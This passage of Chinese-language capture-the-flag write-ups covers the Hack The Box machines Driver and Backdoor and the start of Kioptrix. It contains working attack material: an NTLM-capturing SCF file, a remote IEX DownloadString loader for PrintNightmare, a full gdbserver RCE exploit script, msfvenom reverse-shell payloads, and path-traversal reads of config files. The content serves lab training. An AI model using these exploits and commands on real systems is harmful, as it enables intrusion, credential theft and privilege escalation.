scripts\nroot@shibboleth:/root# cat root.txt\ncat root.txt\nf99dbe4d5d33fc228cb8eaaf5cf0d2ac\n```\n成功获得root权限的flag文件","tags":["Hackthebox"]},{"title":"Driver - Hackthebox","url":"/2021/11/26/Hackthebox/Easy/Hackthebox-Driver/","content":"\n# Hackthebox - Driver\n## 靶场信息\n![](Hackthebox-Driver/image1.png)\n\n## 靶场类型\n![](Hackthebox-Driver/image2.png)\n\n## 信息搜集\n首先使用`nmap`进行端口扫描\n\n```Plain Text\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.106\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-10-12 09:33 EDT\nNmap scan report for 10.10.11.106\nHost is up (0.28s latency).\nNot shown: 65531 filtered ports\nPORT     STATE SERVICE      VERSION\n80/tcp   open  http         Microsoft IIS httpd 10.0\n| http-auth:\n| HTTP/1.1 401 Unauthorized\\x0D\n|_  Basic realm=MFP Firmware Update Center. Please enter password for admin\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\n135/tcp  open  msrpc        Microsoft Windows RPC\n445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)\n5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|specialized|phone\nRunning (JUST GUESSING): Microsoft Windows 2008|Vista|7|8.1|Phone (90%), FreeBSD 6.X (85%)\nOS CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1 cpe:/o:microsoft:windows_vista::sp2 cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1:r1 cpe:/o:microsoft:windows cpe:/o:freebsd:freebsd:6.2\nAggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows Server 2008 SP1 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Embedded Standard 7 (88%), Microsoft Windows 7 (88%), Microsoft Windows Server 2008 (88%), Microsoft Windows 7 or Windows Server 2008 R2 (86%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (86%), Microsoft Windows 7 Professional or Windows 8 (86%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 6h59m52s, deviation: 0s, median: 6h59m52s\n| smb-security-mode:\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode:\n|   2.02:\n|_    Message signing enabled but not required\n| smb2-time:\n|   date: 2021-10-12T20:34:34\n|_  start_date: 2021-10-12T11:55:48\n\nTRACEROUTE (using port 135/tcp)\nHOP RTT       ADDRESS\n1   274.83 ms 10.10.14.1\n2   274.88 ms 10.10.11.106\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 102.40 secon\n```\n![](Hackthebox-Driver/image3.png)\n\n访问`80`端口提示需要登录，随便测个`0 day(admin/admin)`吧\n\n![](Hackthebox-Driver/image4.png)\n\n0 day真好用，直接就进来了\n\n![](Hackthebox-Driver/image5.png)\n\n在`Firmware Updates`处有个上传点，说不定是突破口\n\n![](Hackthebox-Driver/image6.png)\n\n尝试了一下上传，但似乎是失败了，还得找其他思路来突破\n\n咱们把目光放在smb上，我找到了一篇文章，其中的通过NTLM捕获进行攻击我觉得挺不错的\n\n> [https://www.hackingarticles.in/smb-penetration-testing-port-445/](https://www.hackingarticles.in/smb-penetration-testing-port-445/)\n\n> [https://sql--injection.blogspot.com/p/smb.html](https://sql--injection.blogspot.com/p/smb.html)\n\n## 漏洞利用\n首先创建一个shell.scf文件\n\n```bash\n[Shell]\nCommand=2\nIconFile=\\\\10.10.14.18\\share\\test.ico\n[Taskbar]\nCommand=ToggleDesktop\n```\n然后使用responder监听咱们连接htb的那个网卡\n\n```bash\nresponder -wrf --lm -v -I tun0\n```\n然后去之前找到的上传点上传我们的shell.scf文件\n\n```bash\n[SMB] NTLMv2 Client   : 10.10.11.106\n[SMB] NTLMv2 Username : DRIVER\\tony\n[SMB] NTLMv2 Hash     : tony::DRIVER:4621242103dad095:83BFCB019542F3819BC7E01483163418:0101000000000000758C41C3A6E2D701FDD24C3FF72CBC5100000000020000000000000000000000\n```\n然后responder监听的网卡会捕获到账户和hash\n\n我们拿去到hashcat里进行解析\n\n```bash\n指令：hashcat -m 5600 tony::DRIVER:4621242103dad095:83BFCB019542F3819BC7E01483163418:0101000000000000758C41C3A6E2D701FDD24C3FF72CBC5100000000020000000000000000000000 /usr/share/wordlists/rockyou.txt --force\n\n结果：TONY::DRIVER:4621242103dad095:83bfcb019542f3819bc7e01483163418:0101000000000000758c41c3a6e2d701fdd24c3ff72cbc5100000000020000000000000000000000:liltony\n\n账号：tony\n密码：liltony\n```\n使用evil-winrm进行登录\n\n```bash\n安装evil-winrm：gem install evil-winrm\n```\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# evil-winrm -i 10.10.11.106 -u tony -p liltony\n\nEvil-WinRM shell v3.3\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\tony\\Documents>\n```\n```bash\n*Evil-WinRM* PS C:\\Users\\tony\\Documents> whoami\ndriver\\tony\n*Evil-WinRM* PS C:\\Users\\tony\\Documents> ls\n*Evil-WinRM* PS C:\\Users\\tony\\Documents> cd ..\n*Evil-WinRM* PS C:\\Users\\tony> cd Desktop\n*Evil-WinRM* PS C:\\Users\\tony\\Desktop> ls\n\n    Directory: C:\\Users\\tony\\Desktop\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-ar---       11/25/2021   6:07 PM             34 user.txt\n\n*Evil-WinRM* PS C:\\Users\\tony\\Desktop> cat user.txt\n459008f0f8600767fe59f9602714aa04\n```\n成功拿到user权限的flag\n\n## 权限提升\n```bash\nget-process\n```\n使用该命令获取靶机的进程，在进程中可以看到一条\n\n```bash\n379      22     5140      13908 ...12            1228 spoolsv\n```\n在进程中发现spoolsv在运行，突破口就在这了\n\n使用漏洞CVE-2021-1675即可提权\n\n> [https://github.com/calebstewart/CVE-2021-1675](https://github.com/calebstewart/CVE-2021-1675)\n\n在本地使用python3架设一个http服务器\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# python3 -m http.server 80                 \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n```\n然后远程加载我们的脚本\n\n```bash\nIEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.18/CVE-2021-1675.ps1\")\n```\n使用脚本添加一个新用户\n\n```bash\n*Evil-WinRM* PS C:\\Users\\tony\\Documents> Invoke-Nightmare -DriverName \"DRIVER\" -NewUser \"lucifiel\" -NewPassword \"lucifiel123\"\n[+] created payload at C:\\Users\\tony\\AppData\\Local\\Temp\\nightmare.dll\n[+] using pDriverPath = \"C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_f66d9eed7e835e97\\Amd64\\mxdwdrv.dll\"\n[+] added user lucifiel as local administrator\n[+] deleting payload from C:\\Users\\tony\\AppData\\Local\\Temp\\nightmare.dll\n```\n```bash\n*Evil-WinRM* PS C:\\Users\\tony\\Documents> net user\n\nUser accounts for \\\\\n\n-------------------------------------------------------------------------------\nAdministrator            DefaultAccount           Guest\nlucifiel                 tony\nThe command completed with one or more errors.\n\n*Evil-WinRM* PS C:\\Users\\tony\\Documents> runas /user:lucifiel powershell.exe\nEnter the password for lucifiel:\n*Evil-WinRM* PS C:\\Users\\tony\\Documents> net localgroup administrators\nAlias name     administrators\nComment        Administrators have complete and unrestricted access to the computer/domain\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator\nlucifiel\nThe command completed successfully.\n```\n确认权限组没问题\n\n使用新创建的账户进行登录\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# evil-winrm -i 10.10.11.106 -u lucifiel -p lucifiel123\n\nEvil-WinRM shell v3.3\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\lucifiel\\Documents> whoami\ndriver\\lucifiel\n```\n```bash\n*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop> ls\n\n    Directory: C:\\Users\\Administrator\\Desktop\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-ar---       11/26/2021   4:54 AM             34 root.txt\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop> cat root.txt\n548e6653f57567449ffce29432eaa8c3\n```\n成功得到root权限的flag文件","tags":["Hackthebox"]},{"title":"Backdoor - Hackthebox","url":"/2021/11/24/Hackthebox/Easy/Hackthebox-Backdoor/","content":"\n# Hackthebox - Backdoor\n## 靶场信息\n![](Hackthebox-Backdoor/aa013859-cc94-4d60-aee8-126626eb8298.png)\n\n## 靶场类型\n![](Hackthebox-Backdoor/c5f4885a-3c5a-43a4-a83a-cff2f782854e.png)\n\n## 信息搜集\n首先使用nmap进行端口扫描\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.125\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-11-21 20:41 EST\nNmap scan report for 10.10.11.125\nHost is up (0.39s latency).\nNot shown: 65532 closed ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)\n|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)\n|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-generator: WordPress 5.8.1\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Backdoor – Real-Life\n1337/tcp open  waste?\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=11/21%OT=22%CT=1%CU=33566%PV=Y%DS=2%DC=T%G=Y%TM=619AF5\nOS:A4%P=x86_64-pc-linux-gnu)SEQ(SP=FA%GCD=1%ISR=100%TI=Z%CI=Z%II=I%TS=A)SEQ\nOS:(SP=FB%GCD=1%ISR=101%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3\nOS:=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=F\nOS:E88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW\nOS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF\nOS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=\nOS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=\nOS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI\nOS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 587/tcp)\nHOP RTT       ADDRESS\n1   492.34 ms loaclhost (10.10.14.1)\n2   492.34 ms 10.10.11.125\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 75.37 seconds\n```\n从上可以看到该台靶机使用了WordPress 5.8.1 CMS作为服务搭建，咱们去wpscan一下，顺便搜索看看是否有漏洞\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# wpscan --url 10.10.11.125 --enumerate vp,u,vt,tt\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.17\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://10.10.11.125/ [10.10.11.125]\n[+] Started: Sun Nov 21 20:55:16 2021\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://10.10.11.125/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n\n[+] WordPress readme found: http://10.10.11.125/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] Upload directory has listing enabled: http://10.10.11.125/wp-content/uploads/\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://10.10.11.125/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).\n | Found By: Rss Generator (Passive Detection)\n |  - http://10.10.11.125/index.php/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>\n |  - http://10.10.11.125/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>\n\n[+] WordPress theme in use: twentyseventeen\n | Location: http://10.10.11.125/wp-content/themes/twentyseventeen/\n | Latest Version: 2.8 (up to date)\n | Last Updated: 2021-07-22T00:00:00.000Z\n | Readme: http://10.10.11.125/wp-content/themes/twentyseventeen/readme.txt\n | Style URL: http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208\n | Style Name: Twenty Seventeen\n | Style URI: https://wordpress.org/themes/twentyseventeen/\n | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...\n | Author: the WordPress team\n | Author URI: https://wordpress.org/\n |\n | Found By: Css Style In Homepage (Passive Detection)\n |\n | Version: 2.8 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: 'Version: 2.8'\n\n[+] Enumerating Vulnerable Plugins (via Passive Methods)\n\n[i] No plugins Found.\n\n[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)\n Checking Known Locations - Time: 00:00:30 <====================================================================================================================================> (358 / 358) 100.00% Time: 00:00:30\n[+] Checking Theme Versions (via Passive and Aggressive Methods)\n\n[i] No themes Found.\n\n[+] Enumerating Timthumbs (via Passive and Aggressive Methods)\n Checking Known Locations - Time: 00:04:14 <==================================================================================================================================> (2575 / 2575) 100.00% Time: 00:04:14\n\n[i] No Timthumbs Found.\n\n[+] Enumerating Users (via Passive and Aggressive Methods)\n Brute Forcing Author IDs - Time: 00:00:03 <======================================================================================================================================> (10 / 10) 100.00% Time: 00:00:03\n\n[i] User(s) Identified:\n\n[+] admin\n | Found By: Rss Generator (Passive Detection)\n | Confirmed By:\n |  Wp Json Api (Aggressive Detection)\n |   - http://10.10.11.125/index.php/wp-json/wp/v2/users/?per_page=100&page=1\n |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n |  Login Error Messages (Aggressive Detection)\n\n[!] No WPScan API Token given, as a result vulnerability data has not been output.\n[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register\n\n[+] Finished: Sun Nov 21 21:00:23 2021\n[+] Requests Done: 2976\n[+] Cached Requests: 18\n[+] Data Sent: 836.808 KB\n[+] Data Received: 721.12 KB\n[+] Memory used: 297.57 MB\n[+] Elapsed time: 00:05:07\n```\n这边扫描后并没有什么太多有用的信息，插件和主题都没扫描出来，但知道了管理员用户为admin\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# searchsploit WordPress 5.8.1\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                    |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nWordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities                                                                                                               | php/webapps/39553.txt\nWordPress Plugin iThemes Security < 7.0.3 - SQL Injection                                                                                                                         | php/webapps/44943.txt\nWordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection                                                                                                                       | php/webapps/48918.sh\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n```\n搜索后也发现确实存在三个漏洞，但都是插件漏洞，暂时无法确定是否存在这些插件，咱们先去\n\n看看网站内容\n\n![](Hackthebox-Backdoor/940ed798-c2c5-4695-a98c-d570132f10ba.png)\n\n点击Home以后跳转到[http://backdoor.htb/](http://backdoor.htb/)然后提示咱们无法访问，把backdoor.htb加入hosts里再访问\n\n加入后简单看了一下似乎没有什么东西，咱们扫描一下路径看看吧\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -t 50 -u http://backdoor.htb/\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://backdoor.htb/\n[+] Method:                  GET\n[+] Threads:                 50\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Expanded:                true\n[+] Timeout:                 10s\n===============================================================\n2021/11/21 21:15:59 Starting gobuster in directory enumeration mode\n===============================================================\nhttp://backdoor.htb/wp-content           (Status: 301) [Size: 317] [--> http://backdoor.htb/wp-content/]\nhttp://backdoor.htb/wp-includes          (Status: 301) [Size: 318] [--> http://backdoor.htb/wp-includes/]\nhttp://backdoor.htb/wp-admin             (Status: 301) [Size: 315] [--> http://backdoor.htb/wp-admin/]   \nhttp://backdoor.htb/server-status        (Status: 403) [Size: 277]                                       \n\n===============================================================\n2021/11/21 21:47:17 Finished\n===============================================================\n```\n## 漏洞利用\n还是没什么东西，有点难搞啊，只能手动去访问了，首先先去content看看吧\n\n访问content后是空白页面，然后接着根据经验进行手动访问（由于我使用的是流量在进行渗透，继续爆破工作量比较大，只能根据经验进行判断了）\n\n[http://backdoor.htb/wp-content/plugins/](http://backdoor.htb/wp-content/plugins/)在该路径下有内容了，并且是一个目录遍历漏洞\n\n![](Hackthebox-Backdoor/391b9bc7-351a-4095-afa0-954dcc56a79a.png)\n\nebook-download应当是一个wordpress的插件，进去看一下\n\n![](Hackthebox-Backdoor/c56ac66f-b332-4b53-acc5-06f0d537d766.png)\n\n有内容的只有readme.txt 进去看一下\n\n![](Hackthebox-Backdoor/420d2261-aeed-49ed-a74b-967f412dd4d9.png)\n\n确认是一个插件，咱们去exploit-db搜索一下是否有漏洞\n\n> [https://www.exploit-db.com/exploits/39575](https://www.exploit-db.com/exploits/39575)\n\n还真让我们找到一个漏洞\n\n```bash\nhttp://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php\n```\n这是一个任意文件下载的漏洞，下载一个配置文件看一下\n\n![](Hackthebox-Backdoor/633a48e3-4c7f-459c-99d0-ab11340079d4.png)\n\n确认漏洞存在且可被利用，拿着对数据库密码去尝试一下是否可以登录admin用户\n\n![](Hackthebox-Backdoor/f888d85c-2e76-415e-ad02-1642a28f4f6f.png)\n\n好吧看来是我年轻了，是无法直接利用的，咱们还得想办法进入数据库\n\n突然来了灵感，或许突破口在无法读取到任何信息的1337端口上呢？但是我们无法读取1337端口，怎么知道它是什么服务呢？\n\n有办法\n\n使用Wordpress插件的LFI（本地文件包含）来进行端口读取，咱说干就干\n\n![](Hackthebox-Backdoor/e5ab6400-5b2e-444c-afbf-8d15ee90485b.png)\n\n像这样读取/proc/pid/cmdline文件就可以了，其中pid是可变数字，根据测试数字范围应该在900-1000之间\n\n![](Hackthebox-Backdoor/d2303cc9-057d-4aa1-86d6-64a024bbe8de.png)\n\n所以我们像这样设置好就可以开始爆破了\n\n![](Hackthebox-Backdoor/1e6f2fe8-f4a5-4ef3-af20-2657c026f795.png)\n\n有了，可以看到这里有一个gdbserver的服务，经过测试该服务是架设在1337端口上的，可以进行利用\n\n同时还发现一个有趣的东西\n\n![](Hackthebox-Backdoor/2d8b4879-3ed3-498a-b3d8-e641e905ac54.png)\n\n瞧瞧，这还没getshell呢，已经把root的东西都搞到了，也是没谁了\n\n> [https://www.exploit-db.com/exploits/50539](https://www.exploit-db.com/exploits/50539)\n\n这里找到了一篇gdbserver rce的exploit，开干\n\n首先将exploit保存到本地\n\n### Step 1\n```bash\n# Exploit Title: GNU gdbserver 9.2 - Remote Command Execution (RCE)\n# Date: 2021-11-21\n# Exploit Author: Roberto Gesteira Miñarro (7Rocky)\n# Vendor Homepage: https://www.gnu.org/software/gdb/\n# Software Link: https://www.gnu.org/software/gdb/download/\n# Version: GNU gdbserver (Ubuntu 9.2-0ubuntu1~20.04) 9.2\n# Tested on: Ubuntu Linux (gdbserver debugging x64 and x86 binaries)\n\n#!/usr/bin/env python3\n\nimport binascii\nimport socket\nimport struct\nimport sys\n\nhelp = f'''\nUsage: python3 {sys.argv[0]} <gdbserver-ip:port> <path-to-shellcode>\n\nExample:\n- Victim's gdbserver   ->  10.10.10.200:1337\n- Attacker's listener  ->  10.10.10.100:4444\n\n1. Generate shellcode with msfvenom:\n$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin\n\n2. Listen with Netcat:\n$ nc -nlvp 4444\n\n3. Run the exploit:\n$ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin\n'''\n\ndef checksum(s: str) -> str:\n    res = sum(map(ord, s)) % 256\n    return f'{res:2x}'\n\ndef ack(sock):\n    sock.send(b'+')\n\ndef send(sock, s: str) -> str:\n    sock.send(f'${s}#{checksum(s)}'.encode())\n    res = sock.recv(1024)\n    ack(sock)\n    return res.decode()\n\ndef exploit(sock, payload: str):\n    send(sock, 'qSupported:multiprocess+;qRelocInsn+;qvCont+;')\n    send(sock, '!')\n\n    try:\n        res = send(sock, 'vCont;s')\n        data = res.split(';')[2]\n        arch, pc = data.split(':')\n    except Exception:\n        print('[!] ERROR: Unexpected response. Try again later')\n        exit(1)\n\n    if arch == '10':\n        print('[+] Found x64 arch')\n        pc = binascii.unhexlify(pc[:pc.index('0*')])\n        pc += b'\\0' * (8 - len(pc))\n        addr = hex(struct.unpack('<Q', pc)[0])[2:]\n        addr = '0' * (16 - len(addr)) + addr\n    elif arch == '08':\n        print('[+] Found x86 arch')\n        pc = binascii.unhexlify(pc)\n        pc += b'\\0' * (4 - len(pc))\n        addr = hex(struct.unpack('<I', pc)[0])[2:]\n        addr = '0' * (8 - len(addr)) + addr\n\n    hex_length = hex(len(payload))[2:]\n\n    print('[+] Sending payload')\n    send(sock, f'M{addr},{hex_length}:{payload}')\n    send(sock, 'vCont;c')\n\ndef main():\n    if len(sys.argv) < 3:\n        print(help)\n        exit(1)\n\n    ip, port = sys.argv[1].split(':')\n    file = sys.argv[2]\n\n    try:\n        with open(file, 'rb') as f:\n            payload = f.read().hex()\n    except FileNotFoundError:\n        print(f'[!] ERROR: File {file} not found')\n        exit(1)\n\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n        sock.connect((ip, int(port)))\n        print('[+] Connected to target. Preparing exploit')\n        exploit(sock, payload)\n        print('[*] Pwned!! Check your listener')\n\nif __name__ == '__main__':\n    main()\n```\n### Step 2\n然后使用msfvenom生成一个木马\n\n```bash\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.23 LPORT=4444 PrependFork=true -o rev.bin\n```\n### Step 3\n使用nc监听一个本地端口\n\n```bash\nnc -nvlp 4444\n```\n### Step 4\n执行Exploit\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# python3 exploit.py 10.10.11.125:1337 rev.bin                                          1 ⨯\n[+] Connected to target. Preparing exploit\n[+] Found x64 arch\n[+] Sending payload\n[*] Pwned!! Check your listener\n```\n然后成功弹回一个shell\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nc -nvlp 4444   \nlistening on [any] 4444 ...\nconnect to [10.10.14.23] from (UNKNOWN) [10.10.11.125] 50626\nwhoami&&id\nuser\nuid=1000(user) gid=1000(user) groups=1000(user)\n```\n使用python3获取一个交互式shell\n\n```bash\npython3 -c \"import pty;pty.spawn('/bin/bash')\"\nuser@Backdoor:/home/user$\n\nuser@Backdoor:/home/user$ ls\nls\nuser.txt\nuser@Backdoor:/home/user$ cat user.txt  \ncat user.txt\n10ba3c92228d369cea03eec58f58420c\n```\n成功拿到user权限的flag\n\n## 权限提升\n还记得我们之前看到的screen吗？这就是提权的关键，提权只需要两句\n\n```bash\nexport TERM=xterm\nscreen -x root/root\n```\n然后即可进入root权限\n\n```bash\nroot@Backdoor:~# whoami&&id\nwhoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\n成功提权到root权限\n\n```bash\nroot@Backdoor:~# ls\nls\nroot.txt\nroot@Backdoor:~# cat root.txt\ncat root.txt\n692be0661cb8d3c7cdf05379c93b9e8c\n```\n成功拿到root用户的flag权限","tags":["Hackthebox"]},{"title":"Kioptrix Level 1 - Vulnhub","url":"/2021/11/13/Vulnhub/Vulnhub -Kioptrix/","content":"\n## 靶场信息\n\n```\nThis Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.\n这个Kioptrix VM Image是很容易的挑战。游戏的目的是通过任何可能的手段获得root权限（除了实际入侵VM服务器或玩家）。这些游戏的目的是学习漏洞评估和利用方面的基本工具和技术。成功完成这些挑战的方法有很多。\n```\n\n```\n下载地址\nhttps://www.vulnhub.com/entry/kioptrix-level-1-1,22/\n```\n\n## 信息搜集\n\n首先使用arp获取靶机的IP地址\n\n```\n┌──(root💀kali)-[~/Desktop]\n└─# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:5d:2e:77, IPv4: 192.168.1.106\nStarting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.1.102   00:0c:29:55:cb:15       VMware, Inc.\n\n9 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.9.7: 256 hosts scanned in 2.135 seconds (119.91 hosts/sec). 7 responded\n```\n\n确定靶机IP地址为192.168.1.102，使用nmap进行端口扫描\n\n```\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 192.168.1.102\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-11-12 07:47 EST\nNmap scan report for 192.168.1.102\nHost is up (0.00042s latency).\nNot shown: 65529 closed ports\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)\n| ssh-hostkey:\n|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)\n|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)\n|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)\n|_sshv1: Server supports SSHv1\n80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|_http-title: Test Page for the Apache Web Server on Red Hat Linux\n111/tcp  open  rpcbind     2 (RPC #100000)\n| 